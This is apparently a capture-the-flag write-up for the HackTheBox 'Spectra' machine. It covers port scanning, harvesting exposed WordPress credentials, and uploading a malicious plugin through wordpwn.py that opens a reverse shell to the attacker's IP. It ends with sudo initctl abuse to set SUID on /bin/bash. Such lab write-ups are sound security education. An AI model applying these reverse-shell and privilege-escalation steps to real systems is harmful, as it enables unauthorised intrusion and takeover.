[{"categories":["posts"],"content":"Overview Machine: https://www.hackthebox.eu/home/machines/profile/317\nSpectra is an easy ChromeOS machine on HackTheBox created by egre55 (https://www.hackthebox.eu/home/users/profile/1190). We start by enumerating a Wordpress site as well as finding exposed credentials leading to access on the Administrator panel. From there we upload a malicious wordpress plugin that gets us a shell as the nginx user. We then again find a password file, this time belonging to a normal user, making us able to login via ssh. By taking advantage of the fact that the user can execute initctl with root privileges, we run a job that enables us to run bash with SUID permissions, obtaining root access.\nInitial Reconnaissance Port Scanning: We can start with the standard nmap, scanning the default ports:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  nmap -sC -sV 10.10.10.229 -oN spectra.nmap Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-23 15:16 EDT Nmap scan report for 10.10.10.229 Host is up (0.081s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp open http nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesn't have a title (text/html). 3306/tcp open mysql MySQL (unauthorized) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 41.19 seconds   Flags used:  -sC: Scan with the default scripts -sV: Probe open ports to determine service/version info. -oN: Save the nmap output on the designated file in normal format.  Web Server From the nmap scan we can see that an HTTP server is hosted on port 80. HTTP servers are generally the right path to start enumerating so we visit the page: The server appears to be used for issue tracking. By clicking around the page we see the following: This means the server tries to reach spectra.htb, which is not mapped to an IP address. That in turn means we cannot continue until we edit our hosts file to map spectra.htb to 10.10.10.229 which is our target’s IP. We can do that with nano /etc/hosts: First Link (Wordpress Site) By saving the hosts file, we can now navigate the pages. By clicking on the Software Issue Tracker link now correctly redirects us to the following page: Some instant information we can gather is that this is a Wordpress site and that administrator is a username we can later user in case we want to get access to it. By clicking on the Log in link (bottom right), we get to the Wordpress login page: There is something interesting to note here, which is a common bad practice on login pages, giving attackers the ability to validate if a username exists or not. We can see for example that trying to login with the username doomdesire and a random password i get the following error: However, trying to login as administrator and a random password i get the following error: which is clearly a different message from the previous one, confirming that administrator is a valid name. Login pages should always have a consistent error message whether someone enters a valid username or not. At this point there were some things we could try in order to maybe login such as:\n Since this is a wordpress site, it’s a very good idea to run wpscan which is a wordpress enumeration tool found here: https://github.com/wpscanteam/wpscan Since we have a valid username we could also brute force the login page trying out multiple passwords (in general this could potentially lock out a user or/and blacklist our IP so always use with caution). We could use CeWL (https://github.com/digininja/CeWL) to build a password list based on the words used on the site in order to use them for a more targeted password attack (again, be careful about lockouts/blacklists).  These are all great things to have in mind in general, however there was no success, making the wordpress site a dead end for the time being.\n Second Link (Test) Apart from the Software Issue Tracker link, there was also a Test link on the initial page, that redirects us to http://spectra.htb/testing/index.php that returns us an Error establishing a database connection message. However, index.php is not the only file hosted on /testing, something that can be easily confirmed by visiting http://spectra.htb/testing/ : There are multiple .php files listed in this page. In general, you want to look at everything to ensure you did not miss something, however any file containing the words “config” and “login” should be the first to read. Checking the wp-config.php.save file from our browser, it seems to be empty, however by viewing the page source we see a lot of comments: including MySQL credentials! Note that Instead of viewing the page source we could also use curl http://spectra.htb/testing/wp-config.php.save from our terminal and we would also be able to view it.\n Accessing the Wordpress Administrator Panel We now have a password and including the newly found username devtest we have 2 usernames we can try on the Wordpress login page we could not access earlier. Trying with the devstest username brings no results, however, trying with the administrator username get’s us right in: Some instant information we can get is that Wordpress is out-of-date and that our version is 5.4.2. Of course we could have known this right from the start by looking for example at the page source of the login page: or by using the firefox extension “Wappalyzer\": The version can also be found by the previously mentioned wpscan tool.\n Getting a shell as nginx Since we are on the Wordpress adminitration panel, there are some ways we can get a reverse shell. The method we are gonna use here is uploading a malicious plugin. There is a cool script we can use for this, that can be found here: https://github.com/wetw0rk/malicious-wordpress-plugin. It’s usage is pretty straightforward. We are gonna run:\n1 2  chmod +x wordpwn.py ./wordpwn.py 10.10.14.9 4444 Y   This will first make the script executable, then create file called “malicious.zip” that is our vulnerable plugin that we are gonna upload. The plugin is gonna get us a reverse shell on port 4444 that we declared. The Y option declares that we want to automatically start a handler with metasploit: As our handler is waiting to receive a connection, we upload our malicious plugin by navigating to Plugins--\u003eAdd New--\u003eUpload Plugin--\u003eBrowse and select the malicious.zip file we generated with the script. We then select Install Now and then Activate Plugin: As stated in the script github page, once the plugin is installed and activated, we just have to navigate to the following URLs to launch the reverse shell (we have to add the /main part in the URL, which we can observe if we look the URL paths used by our target server. Not including this path will not work, since the 2 files we want to request will not be found):\n http://spectra.htb/main/wp-content/plugins/malicious/wetw0rk_maybe.php http://spectra.htb/main/wp-content/plugins/malicious/QwertyRocks.php  and we get a reverse shell:\n Escalating Privileges to Katie At first glance we can see there is another user on the box named Katie:\n1  cat /etc/passwd | grep \"/bin/bash\"   If we want to get the user.txt we have to escalate our privileges to that user. If we are going to avoid automated tools such as LinPeas, manually searching for configuration files is one of the most standard ways to find possible user credentials, so we can search by typing:\n1  find / -name *.conf* 2\u003e /dev/null   This will search for all files on the system that contain the .conf part on their name. However running this will create a lot of noise from some folders such as /etc, /mnt and /usr so we can begin by filtering them out of our command to have a more manageable output. If we find nothing after filtering them out we will start looking there too. To filter them out we run:\n1  find / -name *.conf* 2\u003e /dev/null | grep -v -e \"/etc/\" -e \"/mnt/\" -e \"/usr\"   We notice a file named /opt/autologin.conf.orig. Reading it, we see there is a password file on a folder named autologin inside /etc. Remember that we filtered out this folder! We could have easily missed it! Reading the passwd file inside /etc/autologin/ we get a password: The possible users to try logging in with this password are root and Katie. There was no success with root, however with Katie the credentials are valid and we can now login as her via ssh!  Escalating Privileges to root Since we are logged in as a proper user, we can now look to gain root privileges. Again, if we are going to avoid an automated tool such as LinPeas, we want to manually search for common vulnerabilities. One of them, is granting users the ability to run all or some binaries as the root user. We can check what Katie can run as root by typing:\n1  sudo -l   This will list all the binaries Katie can run with sudo: We see that we can run initctl as root. As stated on it’s man page, initctl allows a system administrator to communicate and interact with the Upstart. Upstart handles the starting of the tasks and services during boot and stopping them during shutdown. By interacting with the Upstart, we can make initctl start or stop jobs. The way initctl understands what jobs it can work with is by reading the configuration files of them, found on the /etc/init folder. So if we manage to make our own job, we can start it and it will run as the root user since we have sudo rights. So we have 2 options:\n Create a new job by writing a new configuration file (.conf). Edit an already existing one.  The first option is not possible since we do not have permission to write on the /etc folder. That leaves us with the second option. By searching through the /etc/init folder we see that we can’t edit all files, however we have the rights to edit some of the files in there. Great! Below we can see what a job configuration file looks like: Notice the part between “script” and “end script”. That part contains the commands that are gonna run when the job starts. What we want to do is replace these commands with our own. There are some choices here, so let’s try making the job set the SUID permission on /bin/bash. This will let us run bin/bash with root privileges. In this example, i edit the test.conf file with nano: Once we edit the job configuration file we need to start it with initctl (with sudo). After we start it, the job will execute sudo +s /bin/bash as the root user. We can confirm it worked by executing /bin/bash with the -p flag. The -p flag is required in order for this to work since it is used to turn on privileged mode, making the bash shell run with the SUID privileges we set with the job: We are root!\nResources A good place to learn about Upstart and initctl: https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it\n","description":"","tags":null,"title":"Spectra Writeup (HackTheBox)","uri":"/posts/writeups/spectra/"}]
